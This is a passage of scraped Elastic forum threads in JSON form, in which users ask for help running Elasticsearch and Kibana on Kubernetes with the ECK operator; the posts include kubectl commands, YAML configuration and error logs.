    "body": "Hi, I am using the quickstart steps from: https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html. I am using EKS 1.13. If I upgrade to 3 nodes and then go back to 2 nodes, if the node that is shut down the master node is, then I can see the following error: {\"type\": \"server\", \"timestamp\": \"2019-08-19T14:24:40,552+0000\", \"level\": \"ERROR\", \"component\": \"o.e.x.s.a.TokenService\", \"cluster.name\": \"quickstart\", \"node.name\": \"quickstart-es-bsdgq9mjrx\", \"cluster.uuid\": \"IpkatT_qTaqok3H0pIiqRQ\", \"node.id\": \"EppdBoAFT2ajg5hrLwba5g\", \"message\": \"unable to install token metadata\" , \"stacktrace\": [\"org.elasticsearch.cluster.NotMasterException: no longer master. source: [install-token-metadata]\"] } In the tab where 'kubectl port-forward service/quickstart-es-http 9200' is started: E0819 17:15:44.177539 84646 portforward.go:362] error creating forwarding stream for port 9200 -> 9200: Timeout occured Handling connection for 9200 The curl commands end with: curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to localhost:9200 The problem occurs only if the master node is shut down at resizing. If I restart 'kubectl port-forward service/quickstart-es-http 9200' everything works again. Is this a problem on my side? Thank you, Georgeta",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "63b2f99b-9574-499f-895a-1f2cba8e129f",
    "url": "https://discuss.elastic.co/t/how-can-we-patch-the-eck-operator-to-watch-multiple-namespaces/198925",
    "title": "How can we patch the ECK operator to watch multiple namespaces",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "shahtab",
    "date": "September 10, 2019, 3:25pm September 11, 2019, 7:31am",
    "body": "I ahve patched it ONCE to watch one namespace other than default ... But how do you patch for multiple ... ECK worked for the first one but without patching doesn't for the second one. How do we add to the list of namespaces for ECK to watch... What would be the JSON string for that patch statefulset/elastic-operator -n elastic-system --type='json' --patch '[{\"op\":\"add\",\"path\":\"/spec/template/spec/containers/0/env/-\",\"value\": {\"name\": \"NAMESPACE\", \"value\": \"elastic\"}}]'",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "297d91bf-7fe5-443f-ac41-f36fd109e644",
    "url": "https://discuss.elastic.co/t/missing-documentation-for-eck-stack-in-non-default-namespace/198802",
    "title": "Missing documentation for ECK stack in non-default namespace",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "sarjeet",
    "date": "September 10, 2019, 2:23am September 10, 2019, 12:07am September 10, 2019, 2:25am September 10, 2019, 5:16pm September 10, 2019, 5:30pm",
    "body": "I haven't found any documentation that states on how to run ECK stack on k8s with non-default namespace. Currently, Elasticsearch and kibana samples also provided with default namespace. I tried to run ECK stack with non-default namespace, but it failed at different places and had to debug what the issue is. It would have been helpful if there is a documentation that can state what is needed to run ECK stack with non-default namespace.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "42da805c-2a29-4ea7-98d0-b17006064ec2",
    "url": "https://discuss.elastic.co/t/elastic-cloud-with-auth-but-without-https/198337",
    "title": "Elastic cloud with auth but without https",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "O_K",
    "date": "September 6, 2019, 4:12am September 6, 2019, 7:33am September 6, 2019, 7:36am September 6, 2019, 7:58am September 7, 2019, 8:43pm",
    "body": "hello, I wonder the proper way to disable https but remain authentication for this example https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html#k8s-deploy-eck",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e0b898a7-4e42-4d90-af45-9110eb72a358",
    "url": "https://discuss.elastic.co/t/trouble-installing-plugins-on-eck-with-initcontainers-method/198291",
    "title": "Trouble installing plugins on ECK with initContainers method",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "getorca",
    "date": "September 5, 2019, 4:40pm September 5, 2019, 9:05pm September 5, 2019, 5:34pm September 5, 2019, 7:06pm September 6, 2019, 8:06pm",
    "body": "I'm attempting to install plugins using the initContainers method, my code is as follows: version: 7.2.0 nodes: - podTemplate: spec: initContainers: - name: install-plugins command: ['sh', '-c', '| bin/elasticsearch-plugin install --batch repository-s3'] - nodeCount: 3 config: node.master: true node.data: true node.ingest: true volumeClaimTemplates: - metadata: name: elasticsearch-data # note: elasticsearch-data must be the name of the Elasticsearch volume spec: accessModes: - ReadWriteOnce resources: requests: storage: 100Gi storageClassName: do-block-storage updateStrategy: changeBudget: maxSurge: 0 maxUnavailable: 1 However the plugins aren't install and the pods don't update. I can see the version has updated with kubectl describe -f elasticsearch.yaml How do I get the plugin to install?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c36759d2-afa7-46f8-851c-b9868b0b176c",
    "url": "https://discuss.elastic.co/t/timeout-request-did-not-complete-within-requested-timeout-30s/197432",
    "title": "Timeout: request did not complete within requested timeout 30s",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "alexus",
    "date": "August 30, 2019, 1:51am August 30, 2019, 2:47pm September 1, 2019, 1:40am September 3, 2019, 1:56pm September 5, 2019, 5:37pm",
    "body": "Hello World! I'm just Deploy the Elasticsearch cluster, yet unable to delete it: $ kubectl version Client Version: version.Info{Major:\"1\", Minor:\"15\", GitVersion:\"v1.15.3\", GitCommit:\"2d3c76f9091b6bec110a5e63777c332469e0cba2\", GitTreeState:\"clean\", BuildDate:\"2019-08-19T11:13:54Z\", GoVersion:\"go1.12.9\", Compiler:\"gc\", Platform:\"darwin/amd64\"} Server Version: version.Info{Major:\"1\", Minor:\"13+\", GitVersion:\"v1.13.7-gke.24\", GitCommit:\"2ce02ef1754a457ba464ab87dba9090d90cf0468\", GitTreeState:\"clean\", BuildDate:\"2019-08-12T22:05:28Z\", GoVersion:\"go1.11.5b4\", Compiler:\"gc\", Platform:\"linux/amd64\"} $ time kubectl delete elasticsearch quickstart elasticsearch.elasticsearch.k8s.elastic.co \"quickstart\" deleted elasticsearch cluster never gets deleted, meanwhile in Monitor the operator logs: {\"level\":\"info\",\"ts\":1567129334.4552548,\"logger\":\"license-controller\",\"msg\":\"Start reconcile iteration\",\"iteration\":35,\"namespace\":\"default\",\"es_name\":\"quickstart\"} {\"level\":\"info\",\"ts\":1567129334.4554448,\"logger\":\"license-controller\",\"msg\":\"End reconcile iteration\",\"iteration\":35,\"took\":0.000193777,\"namespace\":\"default\",\"es_name\":\"quickstart\"} {\"level\":\"info\",\"ts\":1567129334.4555485,\"logger\":\"elasticsearch-controller\",\"msg\":\"Start reconcile iteration\",\"iteration\":75,\"namespace\":\"default\",\"es_name\":\"quickstart\"} {\"level\":\"info\",\"ts\":1567129334.4557135,\"logger\":\"finalizer\",\"msg\":\"Executing finalizer\",\"finalizer_name\":\"expectations.finalizers.elasticsearch.k8s.elastic.co\",\"namespace\":\"default\",\"name\":\"quickstart\"} {\"level\":\"info\",\"ts\":1567129334.4557407,\"logger\":\"finalizer\",\"msg\":\"Executing finalizer\",\"finalizer_name\":\"observer.finalizers.elasticsearch.k8s.elastic.co\",\"namespace\":\"default\",\"name\":\"quickstart\"} {\"level\":\"info\",\"ts\":1567129334.4557512,\"logger\":\"finalizer\",\"msg\":\"Executing finalizer\",\"finalizer_name\":\"secure-settings.finalizers.elasticsearch.k8s.elastic.co\",\"namespace\":\"default\",\"name\":\"quickstart\"} {\"level\":\"info\",\"ts\":1567129334.4557755,\"logger\":\"finalizer\",\"msg\":\"Executing finalizer\",\"finalizer_name\":\"dynamic-watches.finalizers.k8s.elastic.co/http-certificates\",\"namespace\":\"default\",\"name\":\"quickstart\"} {\"level\":\"info\",\"ts\":1567129364.4594567,\"logger\":\"elasticsearch-controller\",\"msg\":\"Updating status\",\"iteration\":75,\"namespace\":\"default\",\"es_name\":\"quickstart\"} {\"level\":\"info\",\"ts\":1567129364.4595168,\"logger\":\"generic-reconciler\",\"msg\":\"Aggregated reconciliation results complete\",\"result\":{\"Requeue\":false,\"RequeueAfter\":0}} {\"level\":\"info\",\"ts\":1567129364.4595733,\"logger\":\"elasticsearch-controller\",\"msg\":\"End reconcile iteration\",\"iteration\":75,\"took\":30.00402465,\"namespace\":\"default\",\"es_ame\":\"quickstart\"} {\"level\":\"error\",\"ts\":1567129364.4596124,\"logger\":\"kubebuilder.controller\",\"msg\":\"Reconciler error\",\"controller\":\"elasticsearch-controller\",\"request\":\"default/quickstart\",\"error\":\"Timeout: request did not complete within requested timeout 30s\",\"errorCauses\":[{\"error\":\"Timeout: request did not complete within requested timeout 30s\"}],\"stacktrace\":\"github.com/elastic/cloud-on-k8s/operators/vendor/github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/src/github.com/elastic/cloud-on-k8s/operators/vendor/github.com/go-logr/zapr/zapr.go:128\\ngithub.com/elastic/cloud-on-k8s/operators/vendor/sigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).processNextWorkItem\\n\\t/go/src/github.com/elastic/cloud-on-k8s/operators/vendor/sigs.k8s.io/controller-runtime/pkg/internal/controller/controller.go:217\\ngithub.com/elastic/cloud-on-k8s/operators/vendor/sigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).Start.func1\\n\\t/go/src/github.com/elastic/cloud-on-k8s/operators/vendor/sigs.k8s.io/controller-runtime/pkg/internal/controller/controller.go:158\\ngithub.com/elastic/cloud-on-k8s/operators/vendor/k8s.io/apimachinery/pkg/util/wait.JitterUntil.func1\\n\\t/go/src/github.com/elastic/cloud-on-k8s/operators/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133\\ngithub.com/elastic/cloud-on-k8s/operators/vendor/k8s.io/apimachinery/pkg/util/wait.JitterUntil\\n\\t/go/src/github.com/elastic/cloud-on-k8s/operators/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134\\ngithub.com/elastic/cloud-on-k8s/operators/vendor/k8s.io/apimachinery/pkg/util/wait.Until\\n\\t/go/src/github.com/elastic/cloud-on-k8s/operators/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88\"} Please advise.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8fd12606-8116-4579-b779-99d5ba4488b8",
    "url": "https://discuss.elastic.co/t/backup-logs/197069",
    "title": "Backup logs",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "mindsinthecloud",
    "date": "August 28, 2019, 8:42am August 28, 2019, 6:15pm August 28, 2019, 6:18pm August 29, 2019, 3:16am August 29, 2019, 9:26am September 2, 2019, 6:47am",
    "body": "Hi there, I have set up the ECK operator on my k8s cluster on my local machines with 3 nodes and integrated with Fluent Bit for log shipping. May I ask how can I backup the logs? I understand that duplicating the data directory is not recommended and the snapshot is the way to go. I have read this link: https://www.elastic.co/guide/en/cloud-on-k8s/0.9/k8s-snapshot.html but I did not see any example with local storage. Since I'm running on local machines, how can I set it up? Any help is appreciated! thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "2e79b0f3-97f4-4203-b1d7-7250b0afd71b",
    "url": "https://discuss.elastic.co/t/runaway-resource-usage/197560",
    "title": "Runaway Resource Usage",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "j-rewerts",
    "date": "August 30, 2019, 5:18pm August 30, 2019, 5:27pm August 30, 2019, 5:36pm",
    "body": "Hi! I've deployed a cluster following this guide to Kubernetes in GKE. One of my ES nodes was evicted for using too much memory. Screen Shot 2019-08-30 at 11.11.26 AM.png1262×404 43.9 KB Screen Shot 2019-08-30 at 11.11.51 AM.png692×552 8.12 KB I wasn't running anything overnight on the cluster. How can I ensure Elasticsearch doesn't get evicted in the future?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1532e26b-1560-4b5e-b233-f814b8296bcd",
    "url": "https://discuss.elastic.co/t/resource-was-created-with-older-version-of-operator-will-not-take-action-cause-es-cluster-pods-to-stuck/197381",
    "title": "\"Resource was created with older version of operator, will not take action\" cause ES cluster pods to stuck",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "sarjeet",
    "date": "August 29, 2019, 6:36pm August 29, 2019, 6:04pm August 29, 2019, 7:01pm",
    "body": "I am facing an issue with the Elasticsearch (w/o kibana or apm) cluster deployment with the custom operator image compiled and built locally (using latest master without any changes) and tried to deploy a simple Elasticsearch yaml, the statefulset pod is stuck in the Init:1/2 state. I am seeing the following in the operator log which might be the issue here: {\"level\":\"info\",\"ts\":1567096658.9352784,\"logger\":\"annotation\",\"msg\":\"Resource was created with older version of operator, will not take action\",\"controller_version\":\"0.0.0\",\"resource_controller_version\":\"0.0.0\",\"namespace\":\"default\",\"name\":\"quickstart\"} Here is the kubectl output for the pod: default quickstart-es-test-0 0/1 Init:1/2 0 4m51s 172.17.0.6 minikube <none> <none> The version: 7.3.0 is specified in the elasticsearch yaml and using following operaor image: sarjesingh/eck-operator:0.10.0-SNAPSHOT-d07c6f08 Please let me know if you'd need me to debug into something to see the issue. Note: I am able to deploy elasticsearch cluster fine from the quickstart guide.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ea48bebc-65f6-4d0d-9269-9b909cc61886",
    "url": "https://discuss.elastic.co/t/eks-internal-load-balancer-for-kibana/195955",
    "title": "EKS internal load balancer for kibana",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "mario-mazo",
    "date": "August 20, 2019, 2:17pm August 28, 2019, 6:03pm",
    "body": "Hello we are trying to use serviceType LoadBalancer for kibana but it create a public ELB which is not an option for us. How could we add the annotations required like service.beta.kubernetes.io/aws-load-balancer-internal: 0.0.0.0/0 and so on thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "03dd5d4f-dd0f-42bd-b7f1-1d11d6fdadb2",
    "url": "https://discuss.elastic.co/t/kubernetes-and-plugins/196935",
    "title": "Kubernetes and plugins",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tomma100",
    "date": "August 27, 2019, 10:58am August 28, 2019, 5:43pm",
    "body": "We are a team quite new to Kubernetes. Recently we have created an ECK installation running on Google Kubernetes Engine using the recommended deployment instructions (https://www.elastic.co/elasticsearch-kubernetes). So far all is very good, we are comfortable with upgrading versions, changing Elasticsearch node counts and applying basic config changes. Next up, we are looking to install Kibana plugins which does not seem quite so straightforward. All online documentation that we can find for this perform actions directly on the VMs, which seems irrelevant for Kubernetes installs. For this type of install, we would have thought that the Kubernetes yaml definition files will need updating... Can someone confirm this is correct, and if so which files and what changes need to be made to add plugins to our Kibana install?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9ebe1651-a7c5-4b9b-846c-508d8fa153a3",
    "url": "https://discuss.elastic.co/t/custom-kibana-image-readiness-woes/196007",
    "title": "Custom Kibana Image readiness woes",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tadgh",
    "date": "August 20, 2019, 9:10pm August 21, 2019, 5:10pm August 28, 2019, 5:32pm",
    "body": "Hey all, for an internal deploy of ECK, we are using a custom docker image that we host on GCR (gcr.io/etc/etc/kibana:latest). in the Dockerfile, I replace some images that are part of the assets, then remove the optimize folder so that they can be built on boot. Unfortunately, it seems as though kibana's readinessProbe only has an initialDelay of 10 seconds. And unfortunately, the optimizing process takes fairly longer than this, causing this pod to go into a boot loop. Two questions: Is there some way for me to force the optimize in the Dockerfile during build time? If not, any way to modify the readinessProbe for the Kibana CRD? I am on 0.8 Cheers,",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9e9580c4-1f15-4bc6-9834-3942c78ab459",
    "url": "https://discuss.elastic.co/t/error-from-server-notfound-services-quickstart-es-http-not-found/193658",
    "title": "Error from server (NotFound): services \"quickstart-es-http\" not found",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "alexus",
    "date": "August 4, 2019, 3:23am August 4, 2019, 11:25am August 8, 2019, 3:57am August 7, 2019, 8:02am August 8, 2019, 3:55am August 8, 2019, 6:06am August 9, 2019, 5:16am August 9, 2019, 6:20am August 9, 2019, 5:48pm August 9, 2019, 7:01pm August 12, 2019, 6:53pm August 21, 2019, 8:10pm August 21, 2019, 8:42pm August 22, 2019, 2:27pm August 22, 2019, 8:49pm August 23, 2019, 7:33pm August 25, 2019, 11:46pm August 26, 2019, 3:50pm August 26, 2019, 4:01pm",
    "body": "Hello World! I'm trying to follow: #### Request Elasticsearch access yet, running into following error: $ kubectl get service quickstart-es-http Error from server (NotFound): services \"quickstart-es-http\" not found $ $ kubectl get services NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.37.0.1 <none> 443/TCP 6d10h quickstart-es ClusterIP 10.37.4.20 <none> 9200/TCP 4d23h quickstart-es-discovery ClusterIP None <none> 9300/TCP 4d23h quickstart-kibana ClusterIP 10.37.6.26 <none> 5601/TCP 4d23h $ Please advise.",
    "website_area": "discuss",
    "replies": 19
  },
  {
    "id": "cbd1591d-b870-4dba-a09d-a5332f1f0fb5",
    "url": "https://discuss.elastic.co/t/eck-on-iks-with-fluentd-how-to-deal-with-secrets/195757",
    "title": "ECK on IKS with fluentd. How to deal with secrets",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "O_K",
    "date": "August 19, 2019, 2:27pm August 19, 2019, 3:11pm August 21, 2019, 1:28am August 21, 2019, 4:16pm August 21, 2019, 5:03pm August 25, 2019, 7:28pm",
    "body": "Hello, I'm checking https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html and deployed elasticsearch + kibana on IKS with no major issues. Now I'm trying to deploy fluentd with helm chart helm install stable/fluentd-elasticsearch and obviously receive some security error. Please let me know how to deal with this 2019-08-19 14:13:17 +0000 [warn]: suppressed same stacktrace 2019-08-19 14:13:17 +0000 [warn]: [elasticsearch] failed to flush the buffer. retry_time=22 next_retry_seconds=2019-08-19 14:13:48 +0000 chunk=\"590753a76d953933a14e9c6883b6892e\" error_class=Fluent::Plugin::ElasticsearchOutput::ConnectionFailure error=\"Can not reach Elasticsearch cluster ({:host=>\"elasticsearch-client\", :port=>9200, :scheme=>\"http\"})!\" 2019-08-19 14:13:17 +0000 [warn]: suppressed same stacktrace 2019-08-19 14:13:32 +0000 [warn]: [kubelet.log] got incomplete line before first line from /var/log/kubelet.log: \"Aug 19 14:13:32 kube-bld65cjd0gighkrkfff0-mycluster-default-00000172 kubelet.service[24449]: W0819 14:13:32.675534 24449 kubelet_pods.go:832] Unable to retrieve pull secret kube-system/bluemix-default-secret for kube-system/ibm-keepalived-watcher-pcb7h due to secrets \"bluemix-default-secret\" not found. The image pull may not succeed.\\n\" 2019-08-19 14:13:37 +0000 [warn]: [kubelet.log] got incomplete line before first line from /var/log/kubelet.log: \"Aug 19 14:13:37 kube-bld65cjd0gighkrkfff0-mycluster-default-00000172 kubelet.service[24449]: W0819 14:13:37.674962 24449 kubelet_pods.go:832] Unable to retrieve pull secret kube-system/bluemix-default-secret for kube-system/public-crbld65cjd0gighkrkfff0-alb1-566c8969f6-wrcwf due to secrets \"bluemix-default-secret\" not found. The image pull may not succeed.\\n\"",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "84f9e421-cf4a-4fb9-b642-bae2da18c0d9",
    "url": "https://discuss.elastic.co/t/roadmap-and-feature-planning-documentation/196412",
    "title": "Roadmap and feature planning documentation?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "sarjeet",
    "date": "August 22, 2019, 9:46pm August 22, 2019, 10:52pm August 23, 2019, 11:19pm",
    "body": "Hi, My name is Sarjeet Singh, and I have recently started to evaluate ECK for Kubernetes, specifically Elasticsearch portion of operator. I have been looking around to find some documentation around the development contribution or what's the current roadmap and features being planned in near term but couldn't find yet. It would also be helpful if there is a slack/groups to discuss any users/devs related questions as well. Thanks, Sarjeet Singh",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b26b2f27-fc55-4c8e-a55a-36183f813392",
    "url": "https://discuss.elastic.co/t/elastic-cloud-kibana-port-forward-throws-503-with-default-tls-enabled/195866",
    "title": "Elastic Cloud Kibana port-forward throws 503 with default TLS enabled",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "O_K",
    "date": "August 20, 2019, 11:35am",
    "body": "Following this guidance, it seems that Kibana throws 503 error while connecting with kubectl port-forward service/quickstart-kb-http 5601 https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html#k8s-deploy-eck but it started working after adding below line into /etc/hosts and accessing Kibana URL as https://quickstart-kb-http.default.kb.local:5601 127.0.0.1 quickstart-kb-http.default.kb.local into /etc/hosts Errors: 2019-08-19 23:57:06 +0000 [warn]: [elasticsearch] failed to flush the buffer. retry_time=33 next_retry_seconds=2019-08-19 23:57:33 +0000 chunk=\"590806ab8757ebe018dd5f180f845528\" error_class=Faraday::SSLError error=\"SSL_connect returned=1 errno=0 state=error: certificate verify failed (OpenSSL::SSL::SSLError) Unable to verify certificate. This may be an issue with the remote host or with Excon. Excon has certificates bundled, but these can be customized:\\n\\n Excon.defaults[:ssl_ca_path] = path_to_certs\\n ENV['SSL_CERT_DIR'] = path_to_certs\\n Excon.defaults[:ssl_ca_file] = path_to_file\\n ENV['SSL_CERT_FILE'] = path_to_file\\n Excon.defaults[:ssl_verify_callback] = callback\\n (see OpenSSL::SSL::SSLContext#verify_callback)\\nor:\\n Excon.defaults[:ssl_verify_peer] = false (less secure).\\n\" {\"type\":\"log\",\"@timestamp\":\"2019-08-20T08:40:00Z\",\"tags\":[\"error\",\"task_manager\"],\"pid\":1,\"message\":\"Failed to poll for work: Error: Request Timeout after 30000ms\"} {\"type\":\"response\",\"@timestamp\":\"2019-08-20T08:40:07Z\",\"tags\":,\"pid\":1,\"method\":\"get\",\"statusCode\":200,\"req\":{\"url\":\"/login\",\"method\":\"get\",\"headers\":{\"host\":\"172.30.60.200:5601\",\"user-agent\":\"kube-probe/1.13\",\"accept-encoding\":\"gzip\",\"connection\":\"close\"},\"remoteAddress\":\"10.176.253.77\",\"userAgent\":\"10.176.253.77\"},\"res\":{\"statusCode\":200,\"responseTime\":13,\"contentLength\":9},\"message\":\"GET /login 200 13ms - 9.0B\"} {\"type\":\"error\",\"@timestamp\":\"2019-08-20T08:42:50Z\",\"tags\":[\"connection\",\"client\",\"error\"],\"pid\":1,\"level\":\"error\",\"error\":{\"message\":\"139907533506432:error:14094416:SSL routines:ssl3_read_bytes:sslv3 alert certificate unknown:../deps/openssl/openssl/ssl/record/rec_layer_s3.c:1407:SSL alert number 46\\n\",\"name\":\"Error\",\"stack\":\"Error: 139907533506432:error:14094416:SSL routines:ssl3_read_bytes:sslv3 alert certificate unknown:../deps/openssl/openssl/ssl/record/rec_layer_s3.c:1407:SSL alert number 46\\n\"},\"message\":\"139907533506432:error:14094416:SSL routines:ssl3_read_bytes:sslv3 alert certificate unknown:../deps/openssl/openssl/ssl/record/rec_layer_s3.c:1407:SSL alert number 46\\n\"}",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7caf0bc4-0107-4101-8e80-5afa65375992",
    "url": "https://discuss.elastic.co/t/how-to-backup-restore/194541",
    "title": "How to backup/restore?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tew",
    "date": "August 9, 2019, 5:17am August 9, 2019, 6:18am August 9, 2019, 6:32am",
    "body": "I installed the elasticsearch operator using the quickstart guide and have a 3 node cluster running. I can't find any documentation on how to schedule regular snapshots of the ES cluster or how to restore from snapshot. Can someone point me to a doc or guide for backup/restore?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a88d4fe0-5f76-496a-80a4-e4123f214d86",
    "url": "https://discuss.elastic.co/t/cant-find-keystore-data/192134",
    "title": "Can't find keystore data?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "JoeyLemur",
    "date": "July 24, 2019, 8:52pm August 2, 2019, 12:13am August 2, 2019, 3:00pm August 2, 2019, 3:14pm",
    "body": "I'm trying to get OpenID working with ECK, but its not finding the client_secret key/value in the keystore. I have verified that it (seems to be) populating the keystore. If I set up elasticsearch without the OpenID realm: apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 kind: Elasticsearch metadata: name: elasticsearch-poc spec: version: 7.2.0 secureSettings: secretName: azure-openid-secret nodes: - nodeCount: 1 config: node.master: true node.data: true node.ingest: true xpack.security.authc.token.enabled: true volumeClaimTemplates: - metadata: name: elasticdata spec: accessModes: - ReadWriteOnce resources: requests: storage: 100Gi storageClassName: default You can see the keystore gets the appropriate data: [root@elasticsearch-poc-es-5kvf75d48q elasticsearch]# cd /mnt/elastic/secure-settings/ [root@elasticsearch-poc-es-5kvf75d48q secure-settings]# ls -al total 4 drwxrwxrwt 3 root root 100 Jul 24 20:18 . drwxr-xr-x 9 root root 4096 Jul 24 20:20 .. drwxr-xr-x 2 root root 60 Jul 24 20:18 ..2019_07_24_20_18_31.193342258 lrwxrwxrwx 1 root root 31 Jul 24 20:18 ..data -> ..2019_07_24_20_18_31.193342258 lrwxrwxrwx 1 root root 62 Jul 24 20:18 xpack.security.authc.realms.oidc.oidc1.rp.client_secret -> ..data/xpack.security.authc.realms.oidc.oidc1.rp.client_secret [root@elasticsearch-poc-es-5kvf75d48q config]# elasticsearch-keystore list keystore.seed xpack.security.authc.realms.oidc.oidc1.rp.client_secret (I looked in the xpack.security.authc.realms.oidc.oidc1.rp.client_secret file, and it has the correct data.) Now, if I add the OpenID stuff into nodes config (just under the xpack.security.authc.token.enabled line): xpack.security.authc.realms.oidc.oidc1: order: 10 rp.client_id: \"REDACTED\" rp.response_type: \"code\" rp.redirect_uri: \"REDACTED\" op.issuer: \"REDACTED\" op.authorization_endpoint: \"REDACTED\" op.token_endpoint: \"REDACTED\" op.userinfo_endpoint: \"REDACTED\" op.endsession_endpoint: \"REDACTED\" op.jwkset_path: \"REDACTED\" rp.post_logout_redirect_uri: \"REDACTED\" claims.principal: sub And kubectl apply the changes, the new pod spins up, only to give me a stacktrace, the relevant line being: \"Caused by: org.elasticsearch.common.settings.SettingsException: The configuration setting [xpack.security.authc.realms.oidc.oidc1.rp.client_secret] is required\", So, what am I missing that it can't find what is obviously there?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d30e3d1f-16da-4f06-85be-0bd952f8de0d",
    "url": "https://discuss.elastic.co/t/cluster-never-recovers-on-baremetal-cloud-on-k8s-instance/189840",
    "title": "Cluster never recovers on baremetal cloud-on-k8s instance",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Alexei_Smirnov",
    "date": "July 10, 2019, 5:46pm July 10, 2019, 5:53pm July 11, 2019, 8:12am July 12, 2019, 3:00am August 2, 2019, 2:25pm",
    "body": "tried to install it several times starting from 0.8.0 operator, and 0.8.1, always the same issue. whenever we try to reboot one or few machines, cluster never recovers. all masters become unavailable and it continues to try to recover, but fails indefinitely, here's a snippet of log from kubetail'ing all pods. So far ready to give up on the operator, looks like we don't have enough technical knowledge to be able to run this in production and should issues occur - we have no way: not sure if these events would be any helpful: LAST SEEN TYPE REASON OBJECT MESSAGE 1s Warning BackOff pod/kibana-kibana-c98867586-4594g Back-off restarting failed container 1s Warning BackOff pod/kibana-kibana-c98867586-4594g Back-off restarting failed container 1s Warning Unhealthy pod/kibana-kibana-c98867586-4594g Readiness probe failed: HTTP probe failed with statuscode: 503 114s Warning FailedToUpdateEndpoint endpoints/elastic-es-discovery Failed to update endpoint ops/elastic-es-discovery: Operation cannot be fulfilled on endpoints \"elastic-es-discovery\": the object has been modified; please apply your changes to the latest version and try again 114s Warning FailedToUpdateEndpoint endpoints/elastic-es Failed to update endpoint ops/elastic-es: Operation cannot be fulfilled on endpoints \"elastic-es\": the object has been modified; please apply your changes to the latest version and try again 1s Normal Killing pod/elastic-es-qqtm956plr Stopping container elasticsearch 0s Normal Killing pod/elastic-es-k2bcb29q68 Stopping container elasticsearch 115s Warning FailedToUpdateEndpoint endpoints/elastic-es Failed to update endpoint ops/elastic-es: Operation cannot be fulfilled on endpoints \"elastic-es\": the object has been modified; please apply your changes to the latest version and try again 0s Normal Killing pod/elastic-es-pzthtpb4mh Stopping container elasticsearch 0s Normal Killing pod/elastic-es-9hdbl2tzj7 Stopping container elasticsearch 0s Normal Killing pod/elastic-es-4vkcnm5kxv Stopping container elasticsearch 0s Warning Unhealthy pod/elastic-es-9hdbl2tzj7 Readiness probe failed: 0s Warning Unhealthy pod/elastic-es-pzthtpb4mh Readiness probe failed: 0s Warning Unhealthy pod/elastic-es-9hdbl2tzj7 Readiness probe failed: 0s Warning Unhealthy pod/elastic-es-9hdbl2tzj7 Readiness probe failed: 1s Warning Unhealthy pod/kibana-kibana-c98867586-4594g Readiness probe failed: HTTP probe failed with statuscode: 503 Or these logs: [elastic-es-655t98ckzr cert-initializer] 2019-07-10T16:46:32.499Z INFO certificate-initializer No private key found on disk, will create one {\"reason\": \"open /mnt/elastic/private-key/node.key: no such file or directory\"} [elastic-es-655t98ckzr prepare-fs] at org.elasticsearch.cli.Command.main(Command.java:90) [elastic-es-655t98ckzr prepare-fs] at org.elasticsearch.plugins.PluginCli.main(PluginCli.java:47) [elastic-es-655t98ckzr cert-initializer] 2019-07-10T16:46:32.499Z INFO certificate-initializer Creating a private key on disk [elastic-es-655t98ckzr prepare-fs] Installed plugins: [elastic-es-655t98ckzr cert-initializer] 2019-07-10T16:46:32.815Z INFO certificate-initializer Generating a CSR from the private key [elastic-es-655t98ckzr prepare-fs] Plugins installation duration: 52 sec. [elastic-es-655t98ckzr cert-initializer] 2019-07-10T16:46:32.818Z INFO certificate-initializer Serving CSR over HTTP {\"port\": 8001} [elastic-es-655t98ckzr cert-initializer] 2019-07-10T16:46:32.818Z INFO certificate-initializer Watching filesystem for cert update",
    "website_area": "discuss",
    "replies": 5
